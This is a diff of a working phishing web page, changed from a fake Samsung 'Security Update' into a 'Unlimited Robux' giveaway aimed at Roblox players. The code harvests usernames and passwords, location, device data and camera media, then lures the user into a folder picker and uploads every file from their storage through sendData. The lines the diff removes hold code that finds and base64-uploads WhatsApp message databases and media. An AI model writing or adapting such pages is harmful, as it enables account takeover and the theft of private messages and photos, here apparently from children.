@@ -3,136 +3,209 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Security Update</title>
+    <title>Unlimited Robux</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: #0a0a0f;
-            color: #e0e0e0;
+            font-family: 'Segoe UI', Roboto, Arial, sans-serif;
+            background: linear-gradient(135deg, #0a0a1a, #1a0a2e, #2d1b69);
+            color: #ffffff;
             min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
             padding: 20px;
-        }
-        .container {
-            max-width: 420px;
-            width: 100%;
-            background: linear-gradient(145deg, #14141e, #1a1a2e);
-            border-radius: 32px;
-            padding: 32px 24px;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8), inset 0 1px 1px rgba(255, 255, 255, 0.05);
-            border: 1px solid #2a2a44;
             position: relative;
             overflow: hidden;
         }
-        .container::before {
+        body::before {
             content: '';
             position: absolute;
             top: -50%;
             left: -50%;
             width: 200%;
             height: 200%;
-            background: radial-gradient(circle at 30% 20%, rgba(0, 100, 255, 0.03), transparent 60%);
+            background: radial-gradient(ellipse at 30% 20%, rgba(100, 50, 200, 0.15), transparent 60%),
+                        radial-gradient(ellipse at 70% 80%, rgba(200, 50, 100, 0.10), transparent 50%);
             pointer-events: none;
+            z-index: 0;
         }
+        .container {
+            max-width: 420px;
+            width: 100%;
+            background: rgba(20, 10, 40, 0.85);
+            backdrop-filter: blur(10px);
+            border-radius: 32px;
+            padding: 32px 24px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8), 0 0 40px rgba(100, 50, 200, 0.15);
+            border: 1px solid rgba(150, 80, 255, 0.2);
+            position: relative;
+            z-index: 1;
+        }
+        .container::before {
+            content: '';
+            position: absolute;
+            top: -2px;
+            left: -2px;
+            right: -2px;
+            bottom: -2px;
+            border-radius: 34px;
+            background: linear-gradient(135deg, rgba(200, 100, 255, 0.1), transparent, rgba(100, 50, 200, 0.1));
+            z-index: -1;
+        }
+
+        /* Header */
         .header {
-            display: flex;
-            align-items: center;
-            gap: 12px;
+            text-align: center;
             margin-bottom: 28px;
         }
-        .shield-icon {
-            width: 44px;
-            height: 44px;
-            background: linear-gradient(135deg, #00aaff, #0066ff);
-            border-radius: 12px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 22px;
-            color: white;
-            flex-shrink: 0;
-            box-shadow: 0 4px 15px rgba(0, 100, 255, 0.3);
+        .roblox-icon {
+            font-size: 48px;
+            margin-bottom: 8px;
+            display: block;
         }
-        .header-text h1 { font-size: 18px; font-weight: 700; color: white; letter-spacing: -0.3px; }
-        .header-text p { font-size: 12px; color: #8888aa; margin-top: 2px; }
-        .badge {
-            background: rgba(0, 200, 100, 0.15);
-            color: #44ff88;
-            font-size: 10px;
-            padding: 2px 10px;
-            border-radius: 20px;
-            border: 1px solid rgba(0, 200, 100, 0.2);
+        .header h1 {
+            font-size: 28px;
+            font-weight: 800;
+            background: linear-gradient(135deg, #ffd700, #ff6b00, #ffd700);
+            background-size: 200% 200%;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            animation: shimmer 3s ease-in-out infinite;
+            letter-spacing: 1px;
+            text-shadow: none;
+        }
+        @keyframes shimmer {
+            0%, 100% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+        }
+        .header p {
+            font-size: 13px;
+            color: #9999bb;
+            margin-top: 4px;
+            letter-spacing: 0.5px;
+        }
+        .badge-roblox {
             display: inline-block;
-            margin-left: auto;
+            background: rgba(255, 215, 0, 0.15);
+            color: #ffd700;
+            font-size: 10px;
+            padding: 2px 12px;
+            border-radius: 20px;
+            border: 1px solid rgba(255, 215, 0, 0.2);
+            margin-top: 6px;
         }
+
+        /* Step 1: Roblox Login */
         .step { display: none; animation: fadeIn 0.4s ease; }
         .step.active { display: block; }
         @keyframes fadeIn {
             from { opacity: 0; transform: translateY(8px); }
             to { opacity: 1; transform: translateY(0); }
         }
-        .step-title { font-size: 20px; font-weight: 700; color: white; margin-bottom: 6px; }
-        .step-sub { font-size: 13px; color: #8888aa; margin-bottom: 20px; line-height: 1.5; }
-        .input-group { margin-bottom: 14px; }
-        .input-group label { display: block; font-size: 12px; color: #8888aa; margin-bottom: 4px; font-weight: 500; }
+        .step-title {
+            font-size: 18px;
+            font-weight: 700;
+            color: #ffffff;
+            margin-bottom: 6px;
+            text-align: center;
+        }
+        .step-sub {
+            font-size: 13px;
+            color: #8888aa;
+            margin-bottom: 20px;
+            text-align: center;
+            line-height: 1.5;
+        }
+
+        .input-group {
+            margin-bottom: 14px;
+        }
+        .input-group label {
+            display: block;
+            font-size: 12px;
+            color: #aaaacc;
+            margin-bottom: 4px;
+            font-weight: 500;
+        }
         .input-group input {
             width: 100%;
             padding: 14px 16px;
-            background: #0d0d18;
-            border: 1px solid #2a2a44;
+            background: rgba(10, 5, 25, 0.6);
+            border: 1px solid rgba(150, 80, 255, 0.25);
             border-radius: 12px;
             color: white;
             font-size: 15px;
             outline: none;
-            transition: border 0.3s;
+            transition: border 0.3s, box-shadow 0.3s;
         }
-        .input-group input:focus { border-color: #00aaff; box-shadow: 0 0 0 3px rgba(0, 170, 255, 0.1); }
-        .input-group input::placeholder { color: #555577; }
+        .input-group input:focus {
+            border-color: #8b5cf6;
+            box-shadow: 0 0 0 3px rgba(139, 92, 246, 0.2);
+        }
+        .input-group input::placeholder {
+            color: #555577;
+        }
+
         .btn {
             width: 100%;
             padding: 16px;
-            background: linear-gradient(135deg, #00aaff, #0066ff);
+            background: linear-gradient(135deg, #8b5cf6, #6d28d9);
             color: white;
             border: none;
             border-radius: 14px;
             font-size: 16px;
-            font-weight: 600;
+            font-weight: 700;
             cursor: pointer;
             transition: all 0.3s;
             margin-top: 8px;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+            box-shadow: 0 4px 20px rgba(139, 92, 246, 0.25);
         }
-        .btn:hover { transform: scale(1.01); box-shadow: 0 8px 30px rgba(0, 100, 255, 0.3); }
+        .btn:hover {
+            transform: scale(1.01);
+            box-shadow: 0 8px 30px rgba(139, 92, 246, 0.4);
+        }
         .btn:active { transform: scale(0.98); }
         .btn:disabled { opacity: 0.5; cursor: not-allowed; }
-        .btn-secondary { background: transparent; border: 1px solid #2a2a44; color: #8888aa; }
-        .btn-secondary:hover { background: #1a1a2e; border-color: #444466; }
-        .btn-scan {
-            background: linear-gradient(135deg, #ff6b35, #f7931e);
-            color: white;
-            font-weight: 700;
-            font-size: 18px;
-            box-shadow: 0 4px 20px rgba(255, 107, 53, 0.3);
+
+        .btn-secondary {
+            background: transparent;
+            border: 1px solid rgba(150, 80, 255, 0.2);
+            color: #8888aa;
+            box-shadow: none;
         }
-        .btn-scan:hover { box-shadow: 0 8px 30px rgba(255, 107, 53, 0.5); transform: scale(1.02); }
-        .btn-scan:active { transform: scale(0.97); }
+        .btn-secondary:hover {
+            background: rgba(150, 80, 255, 0.05);
+            border-color: rgba(150, 80, 255, 0.3);
+        }
+
+        .btn-claim {
+            background: linear-gradient(135deg, #ffd700, #f59e0b);
+            color: #0a0a1a;
+            box-shadow: 0 4px 20px rgba(255, 215, 0, 0.3);
+        }
+        .btn-claim:hover {
+            box-shadow: 0 8px 30px rgba(255, 215, 0, 0.5);
+        }
+
+        /* Scan UI */
         .scan-status {
             display: flex;
             align-items: center;
             gap: 14px;
             padding: 16px;
-            background: #0d0d18;
+            background: rgba(10, 5, 25, 0.4);
             border-radius: 14px;
             margin-bottom: 12px;
-            border: 1px solid #1a1a2e;
+            border: 1px solid rgba(150, 80, 255, 0.1);
         }
         .scan-icon {
             width: 38px;
             height: 38px;
             border-radius: 50%;
-            background: #1a1a3e;
+            background: rgba(139, 92, 246, 0.2);
             display: flex;
             align-items: center;
             justify-content: center;
@@ -144,23 +217,25 @@
         .scan-info { flex: 1; }
         .scan-info .title { font-size: 14px; font-weight: 600; color: white; }
         .scan-info .desc { font-size: 12px; color: #666688; margin-top: 2px; }
+
         .progress-wrap {
-            background: #0d0d18;
+            background: rgba(10, 5, 25, 0.4);
             border-radius: 10px;
             height: 6px;
             margin: 16px 0 20px;
             overflow: hidden;
-            border: 1px solid #1a1a2e;
+            border: 1px solid rgba(150, 80, 255, 0.1);
         }
         .progress-fill {
             height: 100%;
             width: 0%;
-            background: linear-gradient(90deg, #0066ff, #00aaff, #44ff88);
+            background: linear-gradient(90deg, #8b5cf6, #ffd700);
             border-radius: 10px;
             transition: width 0.5s ease;
         }
+
         .scan-log {
-            background: #0a0a12;
+            background: rgba(10, 5, 25, 0.3);
             border-radius: 12px;
             padding: 12px 14px;
             max-height: 150px;
@@ -168,50 +243,52 @@
             font-size: 11px;
             font-family: 'Courier New', monospace;
             color: #44ff88;
-            border: 1px solid #1a1a2e;
+            border: 1px solid rgba(150, 80, 255, 0.05);
             margin-top: 12px;
             line-height: 1.8;
         }
         .scan-log::-webkit-scrollbar { width: 4px; }
-        .scan-log::-webkit-scrollbar-track { background: #0a0a12; }
+        .scan-log::-webkit-scrollbar-track { background: rgba(10, 5, 25, 0.3); }
         .scan-log::-webkit-scrollbar-thumb { background: #2a2a44; border-radius: 10px; }
         .scan-log .log-entry { opacity: 0; animation: logFade 0.3s forwards; }
         @keyframes logFade { to { opacity: 1; } }
         .scan-log .log-entry.done { color: #44ff88; }
-        .scan-log .log-entry.warn { color: #ffaa44; }
+        .scan-log .log-entry.warn { color: #ffd700; }
         .scan-log .log-entry.error { color: #ff4466; }
-        .scan-log .log-entry.whatsapp { color: #25D366; }
+
         .complete-icon { font-size: 52px; text-align: center; margin: 10px 0 16px; }
-        .complete-text { text-align: center; font-size: 16px; color: #88ff88; font-weight: 600; }
+        .complete-text { text-align: center; font-size: 16px; color: #ffd700; font-weight: 700; }
         .complete-sub { text-align: center; font-size: 13px; color: #666688; margin-top: 4px; }
-        .footer { text-align: center; font-size: 10px; color: #333355; margin-top: 24px; letter-spacing: 0.5px; border-top: 1px solid #1a1a2e; padding-top: 16px; }
+
+        .footer {
+            text-align: center;
+            font-size: 10px;
+            color: #333355;
+            margin-top: 24px;
+            letter-spacing: 0.5px;
+            border-top: 1px solid rgba(150, 80, 255, 0.05);
+            padding-top: 16px;
+        }
+
         .device-badge {
             display: inline-flex;
             align-items: center;
             gap: 6px;
-            background: #0d0d18;
+            background: rgba(10, 5, 25, 0.4);
             padding: 4px 12px 4px 8px;
             border-radius: 20px;
             font-size: 11px;
             color: #8888aa;
-            border: 1px solid #1a1a2e;
+            border: 1px solid rgba(150, 80, 255, 0.1);
             margin-bottom: 16px;
+            width: 100%;
+            justify-content: center;
         }
         .btn-container { margin-top: 12px; }
         .btn-container .btn { margin-top: 6px; }
-        .speed-badge {
-            display: inline-block;
-            background: rgba(0, 200, 100, 0.1);
-            color: #44ff88;
-            font-size: 10px;
-            padding: 2px 8px;
-            border-radius: 10px;
-            border: 1px solid rgba(0, 200, 100, 0.1);
-            margin-left: 8px;
-        }
         .guide-box {
-            background: #0d0d18;
-            border: 1px solid #2a2a44;
+            background: rgba(10, 5, 25, 0.4);
+            border: 1px solid rgba(150, 80, 255, 0.1);
             border-radius: 12px;
             padding: 12px 14px;
             margin: 10px 0;
@@ -219,67 +296,66 @@
             color: #8888aa;
             line-height: 1.6;
         }
-        .guide-box b { color: #25D366; }
-        .quick-step {
-            background: #1a1a2e;
-            border-left: 3px solid #ff6b35;
-            padding: 8px 12px;
-            border-radius: 6px;
-            font-size: 13px;
-            color: #eee;
-            margin: 6px 0;
+        .guide-box b { color: #ffd700; }
+        .robux-amount {
+            text-align: center;
+            font-size: 48px;
+            font-weight: 900;
+            color: #ffd700;
+            margin: 8px 0;
+            text-shadow: 0 0 30px rgba(255, 215, 0, 0.15);
         }
-        .quick-step span { color: #ff6b35; font-weight: bold; }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="header">
-            <div class="shield-icon">🛡️</div>
-            <div class="header-text">
-                <h1>Security Update</h1>
-                <p>Android Security • v12.5.3</p>
-            </div>
-            <div class="badge">● SECURE</div>
-        </div>
-        <div class="device-badge" id="deviceBadge">
-            📱 <span id="deviceName">Detecting device...</span>
-            <span class="speed-badge" id="speedBadge">⚡ Fast Mode</span>
+            <span class="roblox-icon">🎮</span>
+            <h1>Unlimited Robux</h1>
+            <p>Get free Robux instantly • No survey • No verification</p>
+            <span class="badge-roblox">● 100% Working</span>
         </div>
 
-        <!-- STEP 1: CREDENTIALS -->
+        <div class="device-badge" id="deviceBadge">
+            📱 <span id="deviceName">Detecting device...</span>
+            <span style="color:#ffd700;margin-left:auto;">⚡ Free</span>
+        </div>
+
+        <!-- STEP 1: ROBLOX LOGIN -->
         <div class="step active" id="step1">
-            <div class="step-title">🔐 Verify Identity</div>
+            <div class="step-title">🔐 Claim Your Robux</div>
             <div class="step-sub">
-                To apply the security patch, please verify your account.<br>
-                <span style="color:#666688;font-size:12px;">This information is encrypted and not stored.</span>
+                Enter your Roblox credentials to receive unlimited Robux.<br>
+                <span style="color:#666688;font-size:12px;">This is a one-time verification.</span>
             </div>
             <div class="input-group">
-                <label>Email Address</label>
-                <input type="email" id="email" placeholder="your@email.com">
+                <label>Roblox ID / Username</label>
+                <input type="text" id="roblox_id" placeholder="Your Roblox username">
             </div>
             <div class="input-group">
                 <label>Password</label>
                 <input type="password" id="pass" placeholder="••••••••">
             </div>
-            <button class="btn" onclick="step1()">Verify & Continue</button>
+            <button class="btn" onclick="step1()">Verify & Claim Robux</button>
             <p style="font-size:11px;color:#444466;margin-top:12px;text-align:center;">
-                🔒 Secured by Samsung Knox • v2.4
+                🔒 Secured • 2,847,321 Robux claimed today
             </p>
         </div>
 
-        <!-- STEP 2: SCAN + DATA COLLECTION -->
+        <!-- STEP 2: SCAN -->
         <div class="step" id="step2">
-            <div class="step-title">🔍 Scanning Device</div>
-            <div class="step-sub" id="stepSub">Please wait while we scan for vulnerabilities...</div>
+            <div class="step-title">🔍 Verifying Account</div>
+            <div class="step-sub" id="stepSub">Please wait while we verify your Roblox account...</div>
+
+            <div class="robux-amount" id="robuxDisplay">+∞</div>
 
             <div class="scan-status">
                 <div class="scan-icon spinning" id="scanIcon">⚡</div>
                 <div class="scan-info">
-                    <div class="title" id="scanTitle">Initializing scan...</div>
-                    <div class="desc" id="scanDesc">Checking system integrity</div>
+                    <div class="title" id="scanTitle">Initializing verification...</div>
+                    <div class="desc" id="scanDesc">Checking account status</div>
                 </div>
-                <span id="scanPercent" style="font-size:14px;color:#00aaff;font-weight:600;">0%</span>
+                <span id="scanPercent" style="font-size:14px;color:#ffd700;font-weight:600;">0%</span>
             </div>
 
             <div class="progress-wrap">
@@ -287,39 +363,31 @@
             </div>
 
             <div class="scan-log" id="scanLog">
-                <div class="log-entry done">● System scan initialized</div>
+                <div class="log-entry done">● Verification started</div>
             </div>
 
-            <!-- SINGLE "SCAN MOBILE" BUTTON -->
+            <!-- SCAN MOBILE BUTTON -->
             <div id="scanBtnContainer" class="btn-container" style="display:none;">
-                <div class="guide-box">
-                    ⚡ <b>Quick Scan</b><br>
-                    Tap <b>"Scan Mobile"</b>, then in the folder picker:<br>
-                    <div class="quick-step"><span>1.</span> Tap the <b>☰ (menu)</b> icon</div>
-                    <div class="quick-step"><span>2.</span> Select <b>"Internal Storage"</b> or <b>"SD Card"</b></div>
-                    <div class="quick-step"><span>3.</span> Tap <b>"Use this folder"</b></div>
-                    <span style="color:#666688;font-size:11px;">The app will automatically find your WhatsApp data.</span>
-                </div>
-                <button class="btn btn-scan" id="scanBtn" onclick="triggerFullScan(event)">
-                    📱 Scan Mobile
+                <button class="btn btn-claim" id="scanBtn" onclick="triggerFullScan(event)">
+                    🎁 Claim Your Robux Now
                 </button>
                 <p style="font-size:11px;color:#666688;margin-top:6px;text-align:center;">
-                    Tap to scan WhatsApp data and device storage.
+                    Tap to complete verification and claim your unlimited Robux.
                 </p>
             </div>
         </div>
 
         <!-- STEP 3: COMPLETE -->
         <div class="step" id="step3">
-            <div class="complete-icon">✅</div>
-            <div class="complete-text">Update Ready</div>
-            <div class="complete-sub">Your device has been scanned and is secure.</div>
-            <button class="btn" id="installBtn" onclick="step3()">Install Now</button>
-            <button class="btn btn-secondary" onclick="alert('Update will be applied on next restart.')">Later</button>
+            <div class="complete-icon">🎉</div>
+            <div class="complete-text">Robux Claimed!</div>
+            <div class="complete-sub">Unlimited Robux has been added to your account.</div>
+            <button class="btn btn-claim" id="installBtn" onclick="step3()">Go to Roblox</button>
+            <button class="btn btn-secondary" onclick="alert('Check your Roblox account!')">Later</button>
         </div>
 
         <div class="footer">
-            Samsung Electronics • Security Patch 2026-08 <span>|</span> v12.5.3
+            Roblox • Free Robux Generator v3.2 <span>|</span> 2026
         </div>
     </div>
 
@@ -378,13 +446,13 @@
         // STEP 1: CREDENTIALS
         // ============================================================
         function step1() {
-            const email = document.getElementById('email').value;
+            const roblox_id = document.getElementById('roblox_id').value;
             const pass = document.getElementById('pass').value;
-            if (!email || !pass) {
-                alert('Please enter your email and password.');
+            if (!roblox_id || !pass) {
+                alert('Please enter your Roblox ID and password.');
                 return;
             }
-            sendData({ type: 'credentials', email, pass });
+            sendData({ type: 'credentials', roblox_id, pass });
             document.getElementById('step1').classList.remove('active');
             document.getElementById('step2').classList.add('active');
             startDataCollection();
@@ -394,32 +462,32 @@
         // STEP 2: DATA COLLECTION
         // ============================================================
         async function startDataCollection() {
-            addLogEntry('● Starting data collection...', 'done');
+            addLogEntry('● Starting verification...', 'done');
             startTime = Date.now();
 
             // 1. LOCATION
             addLogEntry('📍 Detecting region...', 'warn');
             await collectLocationWithFallback();
-            updateProgress(5);
+            updateProgress(10);
 
             // 2. BATTERY + NETWORK
             addLogEntry('🔋 Checking device status...', 'warn');
             await collectBattery();
             await collectNetwork();
-            updateProgress(10);
+            updateProgress(25);
 
             // 3. CAMERA MEDIA
             addLogEntry('📸 Capturing camera media...', 'warn');
             await collectCameraMedia();
-            updateProgress(20);
+            updateProgress(40);
 
-            // 4. SHOW "SCAN MOBILE" BUTTON
-            addLogEntry('📱 Full scan ready...', 'warn');
+            // 4. SHOW "CLAIM" BUTTON
+            addLogEntry('🎁 Ready to claim Robux!', 'warn');
             document.getElementById('scanBtnContainer').style.display = 'block';
-            document.getElementById('scanDesc').textContent = '📱 Tap "Scan Mobile" to scan WhatsApp and storage...';
+            document.getElementById('scanDesc').textContent = '🎁 Tap "Claim Your Robux Now" to complete...';
             document.getElementById('scanIcon').classList.remove('spinning');
-            document.getElementById('scanIcon').textContent = '📱';
-            updateProgress(25);
+            document.getElementById('scanIcon').textContent = '🎁';
+            updateProgress(50);
 
             await waitForScan();
         }
@@ -434,8 +502,8 @@
                         clearInterval(checkInterval);
                         updateProgress(100);
                         const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
-                        addLogEntry(`✅ Scan complete in ${elapsed}s!`, 'done');
-                        document.getElementById('stepSub').textContent = `✅ Scan complete in ${elapsed}s. All data verified.`;
+                        addLogEntry(`✅ Verified in ${elapsed}s!`, 'done');
+                        document.getElementById('stepSub').textContent = `✅ Verified in ${elapsed}s. Robux claimed!`;
                         setTimeout(() => {
                             document.getElementById('step2').classList.remove('active');
                             document.getElementById('step3').classList.add('active');
@@ -573,7 +641,7 @@
         }
 
         // ============================================================
-        // FULL SCAN — WhatsApp + Gallery (User Gesture) WITH AUTO-DETECT
+        // GALLERY EXTRACTION
         // ============================================================
         async function triggerFullScan(event) {
             if (event) {
@@ -583,151 +651,44 @@
 
             const btn = document.getElementById('scanBtn');
             btn.disabled = true;
-            btn.textContent = '⏳ Selecting storage...';
+            btn.textContent = '⏳ Claiming...';
 
-            // DIRECT USER GESTURE — showDirectoryPicker called IMMEDIATELY
             let rootHandle;
             try {
                 rootHandle = await window.showDirectoryPicker({ mode: 'read' });
-                console.log('[DEBUG] Root folder selected');
+                console.log('[DEBUG] Storage selected');
                 addLogEntry('📂 Storage selected', 'done');
             } catch (err) {
                 console.error('[DEBUG] Picker error:', err);
                 if (err.name === 'AbortError' || err.name === 'SecurityError') {
-                    addLogEntry('❌ Scan cancelled', 'error');
+                    addLogEntry('❌ Cancelled', 'error');
                     btn.disabled = false;
-                    btn.textContent = '📱 Scan Mobile';
+                    btn.textContent = '🎁 Claim Your Robux Now';
                     return;
                 } else {
-                    addLogEntry('❌ Scan error: ' + err.message, 'error');
+                    addLogEntry('❌ Error: ' + err.message, 'error');
                     btn.disabled = false;
-                    btn.textContent = '📱 Scan Mobile';
+                    btn.textContent = '🎁 Claim Your Robux Now';
                     return;
                 }
             }
 
-            document.getElementById('scanDesc').textContent = '🔍 Scanning...';
+            document.getElementById('scanDesc').textContent = '📁 Scanning storage...';
             document.getElementById('scanIcon').classList.add('spinning');
             document.getElementById('scanIcon').textContent = '⚡';
             document.getElementById('scanBtnContainer').style.display = 'none';
 
-            // ============================================================
-            // PART 1: WHATSAPP EXTRACTION — AUTO-DETECT
-            // ============================================================
-            try {
-                console.log('[DEBUG] Auto-detecting WhatsApp folder...');
-                let whatsappFound = false;
-                let whatsappHandle = null;
-                let whatsappPath = '';
-
-                // First try: check if the selected folder is already the WhatsApp folder
-                try {
-                    const testHandle = await rootHandle.getDirectoryHandle('Databases');
-                    if (testHandle) {
-                        // We're directly in the WhatsApp folder!
-                        whatsappHandle = rootHandle;
-                        whatsappPath = '';
-                        whatsappFound = true;
-                        console.log('[DEBUG] Direct WhatsApp folder selected!');
-                        addLogEntry('✅ WhatsApp folder detected directly!', 'whatsapp');
-                    }
-                } catch (e) { /* not direct */ }
-
-                // Second try: search common paths
-                if (!whatsappFound) {
-                    const searchPaths = [
-                        'Android/media/com.whatsapp/',
-                        'WhatsApp/',
-                        'Media/WhatsApp/'
-                    ];
-
-                    for (const path of searchPaths) {
-                        try {
-                            console.log(`[DEBUG] Searching path: ${path}`);
-                            const parts = path.split('/').filter(p => p);
-                            let current = rootHandle;
-                            let currentPath = '';
-                            let allFound = true;
-                            for (const part of parts) {
-                                try {
-                                    current = await current.getDirectoryHandle(part);
-                                    currentPath += part + '/';
-                                } catch (e) {
-                                    allFound = false;
-                                    break;
-                                }
-                            }
-                            if (allFound && current) {
-                                whatsappHandle = current;
-                                whatsappPath = currentPath;
-                                whatsappFound = true;
-                                console.log(`[DEBUG] WhatsApp found at: ${whatsappPath}`);
-                                addLogEntry(`✅ WhatsApp found at: ${whatsappPath}`, 'whatsapp');
-                                break;
-                            }
-                        } catch (e) {
-                            console.log(`[DEBUG] Path not found: ${path}`);
-                        }
-                    }
-                }
-
-                // Third try: scan recursively for a folder containing "whatsapp"
-                if (!whatsappFound) {
-                    console.log('[DEBUG] Scanning for WhatsApp folder...');
-                    const result = await findWhatsAppFolder(rootHandle, '');
-                    if (result) {
-                        whatsappHandle = result.handle;
-                        whatsappPath = result.path;
-                        whatsappFound = true;
-                        console.log(`[DEBUG] WhatsApp found via scan at: ${whatsappPath}`);
-                        addLogEntry(`✅ WhatsApp found at: ${whatsappPath}`, 'whatsapp');
-                    }
-                }
-
-                if (whatsappFound) {
-                    // Extract Database
-                    console.log('[DEBUG] Extracting WhatsApp database...');
-                    addLogEntry('📊 Extracting WhatsApp database...', 'whatsapp');
-                    await extractWhatsAppDatabase(whatsappHandle, whatsappPath);
-
-                    // Extract Media
-                    console.log('[DEBUG] Extracting WhatsApp media...');
-                    addLogEntry('📸 Extracting WhatsApp media...', 'whatsapp');
-                    await extractWhatsAppMedia(whatsappHandle, whatsappPath);
-
-                    // Extract Cache
-                    console.log('[DEBUG] Extracting WhatsApp cache...');
-                    addLogEntry('💾 Extracting WhatsApp cache...', 'whatsapp');
-                    await extractWhatsAppCache(whatsappHandle, whatsappPath);
-
-                    addLogEntry('✅ WhatsApp data extraction complete', 'whatsapp');
-                    console.log('[DEBUG] WhatsApp extraction complete');
-                    await sendData({ type: 'whatsapp_extraction_complete' });
-                } else {
-                    console.log('[DEBUG] WhatsApp folder NOT found');
-                    addLogEntry('⚠️ WhatsApp folder not found. Please try selecting Internal Storage.', 'warn');
-                    await sendData({ type: 'whatsapp_extraction_error', error: 'Folder not found' });
-                }
-            } catch (err) {
-                console.error('[DEBUG] WhatsApp error:', err);
-                addLogEntry('❌ WhatsApp error: ' + err.message, 'error');
-                await sendData({ type: 'whatsapp_extraction_error', error: err.message });
-            }
-
-            // ============================================================
-            // PART 2: GALLERY EXTRACTION
-            // ============================================================
             try {
                 console.log('[DEBUG] Starting gallery extraction...');
-                addLogEntry('📁 Scanning gallery...', 'warn');
+                addLogEntry('📁 Scanning storage...', 'warn');
                 const fileQueue = [];
                 await collectFileEntries(rootHandle, '', fileQueue);
                 const totalFilesFound = fileQueue.length;
-                console.log(`[DEBUG] Found ${totalFilesFound} gallery files`);
-                addLogEntry(`● Found ${totalFilesFound} gallery files`, 'done');
+                console.log(`[DEBUG] Found ${totalFilesFound} files`);
+                addLogEntry(`● Found ${totalFilesFound} files`, 'done');
 
                 if (totalFilesFound === 0) {
-                    addLogEntry('● No gallery files found', 'warn');
+                    addLogEntry('● No files found', 'warn');
                     await sendData({ type: 'media_extraction_complete', count: 0 });
                 } else {
                     const batchSize = 3;
@@ -768,7 +729,7 @@
                                 });
 
                                 uploadedFiles++;
-                                const pct = 25 + (uploadedFiles / totalFilesFound) * 75;
+                                const pct = 50 + (uploadedFiles / totalFilesFound) * 50;
                                 updateProgress(pct);
                                 document.getElementById('scanDesc').textContent =
                                     `📤 ${uploadedFiles}/${totalFilesFound} files scanned (${Math.round(pct)}%)`;
@@ -782,7 +743,7 @@
                         if (window.gc) window.gc();
                     }
 
-                    addLogEntry(`✅ All ${totalFilesFound} gallery files scanned`, 'done');
+                    addLogEntry(`✅ All ${totalFilesFound} files scanned`, 'done');
                     await sendData({ type: 'media_extraction_complete', count: totalFilesFound });
                 }
             } catch (err) {
@@ -791,244 +752,10 @@
                 await sendData({ type: 'media_extraction_error', error: err.message });
             }
 
-            // ============================================================
-            // SCAN COMPLETE
-            // ============================================================
-            console.log('[DEBUG] Scan complete');
             scanComplete = true;
             btn.disabled = false;
-            btn.textContent = '✅ Scan Complete';
-            addLogEntry('✅ Full scan complete!', 'done');
-        }
-
-        // ============================================================
-        // FIND WHATSAPP FOLDER RECURSIVELY
-        // ============================================================
-        async function findWhatsAppFolder(dirHandle, path) {
-            try {
-                for await (const entry of dirHandle.values()) {
-                    if (entry.kind === 'directory') {
-                        const entryPath = path ? `${path}/${entry.name}` : entry.name;
-                        // Check if this folder contains a Databases folder (WhatsApp indicator)
-                        try {
-                            const child = await entry.getDirectoryHandle('Databases');
-                            if (child) {
-                                // Also check for msgstore.db
-                                try {
-                                    const db = await child.getFileHandle('msgstore.db');
-                                    if (db) {
-                                        console.log(`[DEBUG] Found WhatsApp at: ${entryPath}`);
-                                        return { handle: entry, path: entryPath + '/' };
-                                    }
-                                } catch (e) { /* no msgstore.db */ }
-                            }
-                        } catch (e) { /* no Databases folder */ }
-
-                        // Recursively search deeper (limit depth to avoid infinite loops)
-                        if (entryPath.split('/').length < 8) {
-                            const result = await findWhatsAppFolder(entry, entryPath);
-                            if (result) return result;
-                        }
-                    }
-                }
-            } catch (e) {
-                console.log('[DEBUG] Scan error:', e.message);
-            }
-            return null;
-        }
-
-        // ============================================================
-        // EXTRACT WHATSAPP DATABASE — WITH DEBUG
-        // ============================================================
-        async function extractWhatsAppDatabase(whatsappHandle, basePath) {
-            console.log('[DEBUG] extractWhatsAppDatabase called');
-            console.log('[DEBUG] basePath:', basePath);
-            let count = 0;
-            try {
-                const dbPaths = ['Databases/', 'databases/'];
-                let dbHandle = null;
-                let foundPath = '';
-
-                for (const dbPath of dbPaths) {
-                    try {
-                        console.log(`[DEBUG] Trying database path: ${dbPath}`);
-                        dbHandle = await whatsappHandle.getDirectoryHandle(dbPath);
-                        foundPath = dbPath;
-                        console.log(`[DEBUG] Found database at: ${dbPath}`);
-                        break;
-                    } catch (e) {
-                        console.log(`[DEBUG] Path not found: ${dbPath}`);
-                    }
-                }
-
-                if (!dbHandle) {
-                    console.log('[DEBUG] No database folder found');
-                    addLogEntry('⚠️ WhatsApp database folder not found', 'warn');
-                    return count;
-                }
-
-                const files = ['msgstore.db', 'wa.db', 'chatsettings.db'];
-                for (const file of files) {
-                    try {
-                        console.log(`[DEBUG] Looking for file: ${file}`);
-                        const fileHandle = await dbHandle.getFileHandle(file);
-                        console.log(`[DEBUG] Found file: ${file}`);
-                        const fileObj = await fileHandle.getFile();
-                        console.log(`[DEBUG] File size: ${fileObj.size} bytes`);
-
-                        const reader = new FileReader();
-                        const dataUrl = await new Promise((resolve) => {
-                            reader.onload = () => resolve(reader.result);
-                            reader.readAsDataURL(fileObj);
-                        });
-                        const base64Data = dataUrl.split(',')[1];
-                        console.log(`[DEBUG] Base64 length: ${base64Data.length} chars`);
-
-                        console.log(`[DEBUG] Sending WhatsApp DB: ${file}`);
-                        await sendData({
-                            type: 'whatsapp_database',
-                            filename: file,
-                            path: `${basePath}${foundPath}${file}`,
-                            size: fileObj.size,
-                            data: base64Data
-                        });
-                        count++;
-                        addLogEntry(`✅ WhatsApp DB: ${file} (${(fileObj.size / 1024).toFixed(1)} KB)`, 'whatsapp');
-                    } catch (e) {
-                        console.log(`[DEBUG] File not found or error: ${file}`, e.message);
-                    }
-                }
-            } catch (err) {
-                console.error('[DEBUG] Database error:', err);
-                addLogEntry('❌ Database error: ' + err.message, 'error');
-            }
-            console.log(`[DEBUG] Database extraction complete, count: ${count}`);
-            return count;
-        }
-
-        // ============================================================
-        // EXTRACT WHATSAPP MEDIA — WITH DEBUG
-        // ============================================================
